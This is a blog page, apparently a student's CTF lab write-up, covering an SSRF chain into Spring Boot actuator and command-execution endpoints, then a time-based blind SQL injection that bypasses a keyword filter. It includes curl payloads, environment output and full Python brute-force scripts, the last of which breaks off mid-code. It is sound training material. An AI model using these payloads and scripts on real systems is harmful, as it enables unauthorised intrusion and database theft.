@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <title>白白毛毛</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/_custom.css">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body class="bg-post">
+
+<div class="sidebar">
+    <div class="header-info">
+        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
+        <div class="site-author">白白毛毛</div>
+    </div>
+    <nav class="nav">
+        <a href="/">首页</a>
+        <a href="/categories">分类</a>
+        <a href="/archives">所有</a>
+    </nav>
+    <div class="contact-section">
+        <p>If you want find me:</p>
+        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
+        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
+        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
+    </div>
+</div>
+
+<div class="content-area">
+    
+<div style="height: 60px;"></div>
+<div class="content-wrapper">
+    <article class="post-article">
+        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">PS:感觉可以做一个</h1>
+        
+        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
+            <span>📅 发布: 2025-11-11</span>
+            <span style="margin: 0 15px;">|</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2026-01-02</span>
+            
+            
+             <span style="margin: 0 15px;">|</span>
+             📂 学习
+            
+        </div>
+        
+        <div class="article-content">
+            <style>
+/* 恢复代码块为等宽字体，但字号与正文一致，避免视觉突变 */
+:root { --post-font-size: 1rem; }
+/* 内联代码和键盘输入样式：等宽、与正文同大小 */
+code, kbd, tt {
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "DejaVu Sans Mono", monospace !important;
+  font-size: var(--post-font-size) !important;
+  font-weight: normal !important;
+  background: rgba(0,0,0,0.03);
+  padding: .06em .22em;
+  border-radius: 4px;
+}
+
+/* 多行代码块保留等宽并优化换行与可读性 */
+pre, pre code, .highlight, .hljs {
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "DejaVu Sans Mono", monospace !important;
+  font-size: var(--post-font-size) !important;
+  line-height: 1.6 !important;
+  white-space: pre-wrap !important;     /* 保留换行同时避免横向滚动过宽 */
+  word-break: break-word !important;
+  color: inherit !important;
+  background: rgba(0,0,0,0.02);
+  padding: .6em .8em !important;
+  border-radius: 6px;
+  overflow: auto !important;
+}
+
+/* 如果之前覆盖过更具体的类（如 .language-xxx），也一并恢复 */
+.language-plaintext,
+[class*="language-"],
+.token {
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "DejaVu Sans Mono", monospace !important;
+  font-size: var(--post-font-size) !important;
+}
+</style>
+
+<h1 id="”Java-Developer”-1"><a href="#”Java-Developer”-1" class="headerlink" title="#”Java Developer” (1)"></a>#”Java Developer” (1)</h1><p><img src="/images/QQ20251111-175359.png" alt="alt text"></p>
+<p>在看之前，提醒，需要自己理解一下题目需要你干什么，虽然这是我之前做的，但一些知识点感觉还是很重要，所以就心血来潮写了。<br>靶场web题：”Java Developer” (1)</p>
+<p>打开题目所给的靶机，只有这么一句话根本没有下文，一开始很难有思路的，用工具扫一下。</p>
+<blockquote>
+<p>开始扫描……<br><a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/robots.txt">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/robots.txt</a></p>
+</blockquote>
+<p>看到这有个robots.txt，打开看一下</p>
+<blockquote>
+<p>User-agent: *<br>Disallow: &#x2F;backend&#x2F;*<br>Disallow: &#x2F;actuator&#x2F;*<br>Allow: &#x2F;front&#x2F;spider</p>
+</blockquote>
+<p>&#x2F;backend&#x2F;和&#x2F;actuator&#x2F;都被禁止了，说明这两个里面肯定有东西。<br>&#x2F;front&#x2F;spider 又允许这个，或许这个可以是一个跳板。</p>
+<blockquote>
+<p>我们先测试一下：<br>C:\Users\G1731&gt;curl <a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider</a><br>{“timestamp”:”2025-11-11T09:59:53.995+0000”,”status”:404,”error”:”Not Found”,”message”:”No message available”,”path”:”&#x2F;front&#x2F;front&#x2F;spider”}</p>
+</blockquote>
+<p>我们访问的是&#x2F;front&#x2F;spider，可它的反馈确是&#x2F;front&#x2F;front&#x2F;spider，这说明一开始所有访问都是在这个&#x2F;front&#x2F;下进行的，被固定住了。</p>
+<p>我们这次正确访问一下：</p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl <a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider</a><br>尝试 <a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider?url=https://www.baidu.com">点击此处</p>
+</blockquote>
+<p>它返回了一个链接，看不出什么意思，我们再访问：</p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl “http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=https://www.baidu.com&quot;</p>
+</blockquote>
+<!DOCTYPE html><!--STATUS OK--><html> <head><meta http-equiv=content-type content=text/html;charset=utf-8>...（百度首页HTML内容）...
+<p>这叽里呱啦的一大堆，完全不懂意思，但我们只要知道一点，这个地址是百度，而它在url后面，说明我们就可以利用这个向服务器发出请求，并得到反馈。</p>
+<p>再扫一下端口，发现80是开放的，外网端口开放且能发出请求，那我们再试一试内网：</p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl “http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/&quot;<br>{“timestamp”:”2025-11-11T10:09:34.482+0000”,”status”:500,”error”:”Internal Server Error”,”message”:”HTTP请求失败，响应码: 404”,”path”:”&#x2F;front&#x2F;spider”}</p>
+<p>C:\Users\G1731&gt;curl “http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://127.0.0.1:8080/&quot;<br>{“timestamp”:”2025-11-11T10:09:35.337+0000”,”status”:500,”error”:”Internal Server Error”,”message”:”HTTP请求失败，响应码: 404”,”path”:”&#x2F;front&#x2F;spider”}</p>
+</blockquote>
+<p>有请求说明，8080端口是开的，而且有内网。</p>
+<p>我们试一下用内网访问刚才几个禁止：</p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl “http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator&quot;<br>{“_links”:{“self”:{“href”:”http://localhost:8080/actuator&quot;,&quot;templated&quot;:false},&quot;health&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/health&quot;,&quot;templated&quot;:false},&quot;health-path&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/health/{*path}”,”templated”:true},”info”:{“href”:”http://localhost:8080/actuator/info&quot;,&quot;templated&quot;:false},&quot;mappings&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/mappings&quot;,&quot;templated&quot;:false}}}</p>
+<p>C:\Users\G1731&gt;curl “http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend&quot;<br>Nice! You will definitely succeed.</p>
+</blockquote>
+<p>运气很好，一下子就肯定了我们的猜想，方向是对的，那之后呢，其实还是不知道具体要怎么去操作，去看了点csdn，</p>
+<blockquote>
+<p>https://blog.csdn.net/qq_43290288&#x2F;article&#x2F;details&#x2F;106296283</p>
+</blockquote>
+<p>发现这个actuator很厉害，可以直接在控制台发现所有监控点的映射信息，那不就说明可以查看所有东西吗</p>
+<p><img src="/images/QQ20251111-181803.png" alt="alt text"></p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl “<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator/mappings">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator/mappings</a>“<br>{“contexts”:{“application”:{“mappings”:{“dispatcherServlets”:{“dispatcherServlet”:[{“handler”:”Actuator web endpoint ‘health’”,”predicate”:”{GET &#x2F;actuator&#x2F;health, produces [application&#x2F;vnd.spring-boot.actuator.v3+json || application&#x2F;vnd.spring-boot.actuator.v2+json || application&#x2F;json]}”,”details”:{“handlerMethod”:{“className”:”org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler”,”name”:”handle”,”descriptor”:”(Ljavax&#x2F;servlet&#x2F;http&#x2F;HttpServletRequest;Ljava&#x2F;util&#x2F;Map;)Ljava&#x2F;lang&#x2F;Object;”},”requestMappingConditions”:{“consumes”:[],”headers”:[],”methods”:[“GET”],”params”:[],”patterns”:[“&#x2F;actuator&#x2F;health”],”produces”:[{“mediaType”:”application&#x2F;vnd.spring-boot.actuator.v3+json”,”negated”:false},{“mediaType”:”application&#x2F;vnd.spring-boot.actuator.v2+json”,”negated”:false},{“mediaType”:”application&#x2F;json”,”negated”:false}]}}},…（完整的mappings响应）…</p>
+</blockquote>
+<p>什么都来了，但什么也看不懂，这个时候就要请ai老师帮帮忙了。</p>
+<blockquote>
+<p>从 mappings 响应中，我们找到了所有后端接口：</p>
+<p>🔥 BackendController 接口：<br>&#x2F;backend&#x2F;file - 文件读取功能<br>&#x2F;backend&#x2F;whoami - 命令执行功能<br>&#x2F;backend&#x2F;env - 环境变量功能<br>&#x2F;backend - 基础接口（返回 “Nice! You will definitely succeed.”）</p>
+</blockquote>
+<p>一针见血，我们就用这几个端口测试一下：</p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl “<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/flag">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/flag</a>“<br>离$FLAG很近了哦</p>
+<p>C:\Users\G1731&gt;curl “<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/proc/self/environ">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/proc/self/environ</a>“<br>离$FLAG很近了哦</p>
+<p>C:\Users\G1731&gt;curl “<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=whoami">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=whoami</a>“<br>root</p>
+<p>C:\Users\G1731&gt;curl “<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=env">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=env</a>“<br>HOSTNAME&#x3D;a31cee05bb1eJAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;openjdk-8PWD&#x3D;&#x2F;HOME&#x3D;&#x2F;rootLANG&#x3D;C.UTF-8FLAG&#x3D;G0D{e03bef26-6922-4157-abed-8e979286cf98}SHLVL&#x3D;1PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;openjdk-8&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binJAVA_VERSION&#x3D;8u342_&#x3D;&#x2F;usr&#x2F;local&#x2F;openjdk-8&#x2F;bin&#x2F;java</p>
+</blockquote>
+<p>Great！ G0D{e03bef26-6922-4157-abed-8e979286cf98} 一下子就拿到flag了。</p>
+<p>说实话，我一开始做的时候看了无数遍离$FLAG很近了哦就是找不到flag，还以为做不出来呢。</p>
+<p>咕咕嘎嘎！！！</p>
+<hr>
+<h1 id="sql-manager-sys"><a href="#sql-manager-sys" class="headerlink" title="#sql_manager_sys"></a>#sql_manager_sys</h1><p><img src="/images/QQ20260102-140024.png" alt="alt text"></p>
+<p>由于最近都在学sql，所以就尝试看看靶场的题目。</p>
+<p>这题还是很有难度的，它不是我目前比较有印象的联合注入和报错注入，反而是没那么熟练的时间注入，所以还是有用到ai辅助的。</p>
+<p><img src="/images/QQ20260102-140332.png" alt="alt text"></p>
+<p>一开始直接看题目，其实就是很正常的登入页面，我的想法还是不是注入admin就是注入password，于是我先用bp抓了个包。</p>
+<p><img src="/images/QQ20260102-140332.png" alt="alt text"></p>
+<p>你看，它是以 user&#x3D;???&amp;&amp;passwd&#x3D;??? 的形式，以POST方式，提交到url的check.php。</p>
+<p>所以猜测数据库中肯定有user和passwd的表名，毕竟它是要比较我提交的账号和密码是否跟它表中的相同，才算我登入成功。</p>
+<p>想了想，我就先使用起来sqlmap。</p>
+<p>一番扫描下来，可以说是完全没有收获，sqlmap在这种难度高的题目面前直接就是摆设，后端只要随波加一点东西，sqlmap就会all fail。</p>
+<p>没办法，我就先测试这个题目后端到底拦截什么。</p>
+<p>一番curl下来，我们可以得到。</p>
+<ul>
+<li><strong>拦截名单</strong>：<code>SELECT</code>、<code>UNION</code>、<code>INFORMATION_SCHEMA</code>、<code>JOIN</code>、<code>AND</code>、<code>OR</code> 以及各种空格变体（如 <code>%0a</code>）。</li>
+<li><strong>放行名单</strong>：<code>SLEEP()</code>、<code>SUBSTR()</code>、<code>ASCII()</code>、<code>IF</code>、<code>||</code>。</li>
+</ul>
+<p>常规的注入都需要 <code>SELECT</code> 来查询数据，或者用 <code>INFORMATION_SCHEMA</code> 来查表名。现在 <code>SELECT</code> 被封死，基本就是直接榨干了。</p>
+<p>绕过也没有，变体也失败。</p>
+<p>select这条路直接失败。</p>
+<p>因为是有账号和密码的输入接口，所以猜测后台有类似这样的源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE user=&#x27;$user&#x27; AND passwd=&#x27;$passwd&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>可以引用当前表的列名进行逻辑判断，比如：延时测试，如果条件为真，结果为 1，执行 <code>sleep(2.5)</code>；如果为假，结果为 0，不延时。</p>
+<p>构造 Payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nonexistent&#x27; || sleep(2.5 * (ascii(substr(database(),1,1))=99)) #</span><br></pre></td></tr></table></figure>
+
+<p><strong>原理</strong>：如果数据库名的第 1 位字符是 ‘c’ (ascii 99)，则 <code>1 * 2.5</code> 触发延时；否则不延时。</p>
+<p>当然了，这个是爆破方法，我肯定不能一个一个去填，让ai给我了脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># === 配置区域 ===</span><br><span class="line">url = &quot;http://18f25160-98b8-4fbe-b4b0-b55ffc1c6886.ctf.g0dsec.com/check.php&quot;</span><br><span class="line">sleep_time = 2.5  # 设置延迟时间</span><br><span class="line"></span><br><span class="line"># 字符集：数据库名通常由小写字母、数字、下划线组成</span><br><span class="line">chars = string.ascii_lowercase + string.digits + &quot;_&quot;</span><br><span class="line"></span><br><span class="line">print(&quot;[*] 开始爆破数据库名...&quot;)</span><br><span class="line">print(f&quot;[*] 目标 URL: &#123;url&#125;&quot;)</span><br><span class="line">print(&quot;-&quot; * 50)</span><br><span class="line"></span><br><span class="line">db_name = &quot;&quot;</span><br><span class="line"></span><br><span class="line"># 假设数据库名长度不超过 20</span><br><span class="line">for i in range(1, 21):</span><br><span class="line">    found = False</span><br><span class="line">    for char in chars:</span><br><span class="line">        char_ord = ord(char)</span><br><span class="line">        </span><br><span class="line">        # === Payload 构造 ===</span><br><span class="line">        # 原理: user=&#x27;不存在&#x27; || (如果 数据库名第i位是char 则 sleep(2.5)) #</span><br><span class="line">        # 1. nonexistent&#x27; : 让前面的 user 查询失败 (False)</span><br><span class="line">        # 2. || : 逻辑或，执行后面的语句</span><br><span class="line">        # 3. ascii(substr(database(), i, 1)) : 取数据库名第 i 位字符的 ASCII 码</span><br><span class="line">        # 4. * : 乘法运算。如果条件为真(1)，则 sleep(2.5*1)；如果为假(0)，则 sleep(0)</span><br><span class="line">        </span><br><span class="line">        payload = f&quot;nonexistent&#x27;||(sleep(&#123;sleep_time&#125;*(ascii(substr(database(),&#123;i&#125;,1))=&#123;char_ord&#125;)))#&quot;</span><br><span class="line">        </span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;user&quot;: payload,</span><br><span class="line">            &quot;passwd&quot;: &quot;1&quot;  # 密码随便填</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        try:</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            # 发送请求，设置超时时间略小于 sleep_time</span><br><span class="line">            # 如果超时，说明服务器 sleep 了，意味着猜对了</span><br><span class="line">            requests.post(url, data=data, timeout=2)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            # 捕获超时异常，说明猜对了</span><br><span class="line">            db_name += char</span><br><span class="line">            print(f&quot;[+] 发现第 &#123;i&#125; 位字符: &#123;char&#125;  |  当前数据库名: &#123;db_name&#125;&quot;)</span><br><span class="line">            found = True</span><br><span class="line">            break</span><br><span class="line">        except Exception as e:</span><br><span class="line">            # 处理网络错误等其他异常</span><br><span class="line">            pass</span><br><span class="line">            </span><br><span class="line">    if not found:</span><br><span class="line">        print(f&quot;\n[*] 爆破结束 (该位置未匹配到字符，可能长度已达上限)。&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(&quot;-&quot; * 50)</span><br><span class="line">print(f&quot;[SUCCESS] 最终数据库名: &#123;db_name&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本最后跑出来ctf，说明数据库的名字就是ctf，但接下来又产生很尴尬的事情了，正常得到数据库名后要利用select从数据库里面查询东西，但一开始就已经测试到，select是在题目黑名单的里面，所以，有这个数据库名是用不到的，我们要做的应该是直接通过猜测，爆破表名字，并从表中爆破出数据来。</p>
+<p>脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://18f25160-98b8-4fbe-b4b0-b55ffc1c6886.ctf.g0dsec.com/check.php&quot;</span><br><span class="line"># 常见列名字典</span><br><span class="line">columns = [&#x27;passwd&#x27;, &#x27;id&#x27;, &#x27;username&#x27;, &#x27;flag&#x27;, &#x27;password&#x27;, &#x27;admin&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;[*] 正在利用 No-Select 逻辑爆破列名...&quot;)</span><br><span class="line">print(&quot;[*] 原理: nonexistent&#x27; || (sleep(2.5 * (col=col))) #&quot;)</span><br><span class="line"></span><br><span class="line">for col in columns:</span><br><span class="line">    # Payload 逻辑:</span><br><span class="line">    # 如果列存在: col=col 为真(1) -&gt; sleep(2.5 * 1) -&gt; 延迟</span><br><span class="line">    # 如果列不存在: 报错 -&gt; sleep 不执行 -&gt; 无延迟</span><br><span class="line">    payload = f&quot;nonexistent&#x27;||(sleep(2.5*(&#123;col&#125;=&#123;col&#125;)))#&quot;</span><br><span class="line">    </span><br><span class="line">    data = &#123;&quot;user&quot;: payload, &quot;passwd&quot;: &quot;1&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        requests.post(url, data=data, timeout=2)</span><br><span class="line">    except requests.exceptions.ReadTimeout:</span><br><span class="line">        print(f&quot;[+] 发现存在列名: &#123;col&#125;&quot;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
+
+<p>之所以不去看表，是因为没必要了，我们目前就已经在某个表里了，管他是什么，除非当前表里没数据，在考虑其他的。</p>
+<p>运行脚本后发现，当前表明为admin，存在两个列。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(base) PS C:\Users\G1731\Downloads&gt; &amp; C:/Users/G1731/anaconda3/python.exe c:/Users/G1731/Downloads/2.py</span><br><span class="line">[*] 正在利用 No-Select 逻辑爆破列名...</span><br><span class="line">[*] 原理: nonexistent&#x27; || (sleep(2.5 * (col=col))) #</span><br><span class="line">[+] 发现存在列名: passwd</span><br><span class="line">[+] 发现存在列名: id</span><br></pre></td></tr></table></figure>
+
+<p>用脚本一个一个字符的看列内数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import urllib3</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># 禁用 SSL 警告</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"># === 配置区域 ===</span><br><span class="line">URL = &quot;http://18f25160-98b8-4fbe-b4b0-b55ffc1c6886.ctf.g0dsec.com/check.php&quot;</span><br><span class="line">SLEEP_TIME = 2.0        # 注入延时时间</span><br><span class="line">TIMEOUT_SETTING = 1.5   # 请求超时时间 (必须小于 SLEEP_TIME)</span><br><span class="line"></span><br><span class="line"># 字符集：包含字母、数字、标点符号</span><br><span class="line">CHARS = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line">def check_condition(condition_sql):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    发送 Payload 判断条件是否为真</span><br><span class="line">    原理: nonexistent&#x27; || (sleep(SLEEP_TIME * (条件))) #</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    payload = f&quot;nonexistent&#x27;||(sleep(&#123;SLEEP_TIME&#125;*(&#123;condition_sql&#125;)))#&quot;</span><br><span class="line">    data = &#123;&quot;user&quot;: payload, &quot;passwd&quot;: &quot;1&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        # 发送请求</span><br><span class="line">        requests.post(URL, data=data, timeout=TIMEOUT_SETTING)</span><br><span class="line">        # 如果没有超时，说明 sleep 没执行 -&gt; 条件为假</span><br><span class="line">        return False</span><br><span class="line">    except requests.exceptions.ReadTimeout:</span><br><span class="line">        # 如果超时，说明 sleep 执行了 -&gt; 条件为真</span><br><span class="line">        return True</span><br><span class="line">    except Exception:</span><br><span class="line">        # 网络错误等情况默认返回 False</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def extract_data(target_id, column_name, max_len=60):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    针对特定 ID 和 列名 提取数据</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    print(f&quot;    [+] 正在提取 ID=&#123;target_id&#125; 的 &#123;column_name&#125; ...&quot;)</span><br><span class="line">    </span><br><span class="line">    for i in range(1, max_len + 1):</span><br><span class="line">        found_char = False</span><br><span class="line">        for char in CHARS:</span><br><span class="line">            char_ord = ord(char)</span><br><span class="line">            # 核心 Payload: (id=target_id) * (ascii(substr(col,i,1))=char)</span><br><span class="line">            condition = f&quot;(id=&#123;target_id&#125;)*(ascii(substr(&#123;column_name&#125;,&#123;i&#125;,1))=&#123;char_ord&#125;)&quot;</span><br><span class="line">            </span><br><span class="line">            if check_condition(condition):</span><br><span class="line">                result += char</span><br><span class="line">                print(f&quot;        [&gt;] 进度: &#123;result&#125;&quot;, end=&#x27;\r&#x27;)</span><br><span class="line">                found_char = True</span><br><span class="line">                break</span><br><span class="line">        </span><br><span class="line">        if not found_char:</span><br><span class="line">            break # 这一位没匹配到字符，说明数据结束</span><br><span class="line">            </span><br><span class="line">    print(f&quot;\n    [OK] &#123;column_name&#125;: &#123;result&#125;&quot;)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"># === 主程序 ===</span><br><span class="line">def main():</span><br><span class="line">    print(&quot;[*] 开始执行 SQL 盲注全量提取脚本...&quot;)</span><br><span class="line">    print(f&quot;[*] 目标 URL: &#123;URL&#125;&quot;)</span><br><span class="line">    print(&quot;-&quot; * 50)</span><br><span class="line"></span><br><span class="line">    # --- 阶段 1: 确定用户名列名 ---</span><br><span class="line">    print(&quot;[1] 正在探测存放用户名的列名...&quot;)</span><br><span class="line">    possible_cols = [&#x27;user&#x27;, &#x27;username&#x27;, &#x27;name&#x27;, &#x27;account&#x27;, &#x27;admin_user&#x27;, &#x27;login_id&#x27;]</span><br><span class="line">    username_col = &quot;user&quot; # 默认值，防跑不出来</span><br><span class="line">    </span><br><span class="line">    for col in possible_cols:</span><br><span class="line">        # 探测列是否存在: col=col</span><br><span class="line">        if 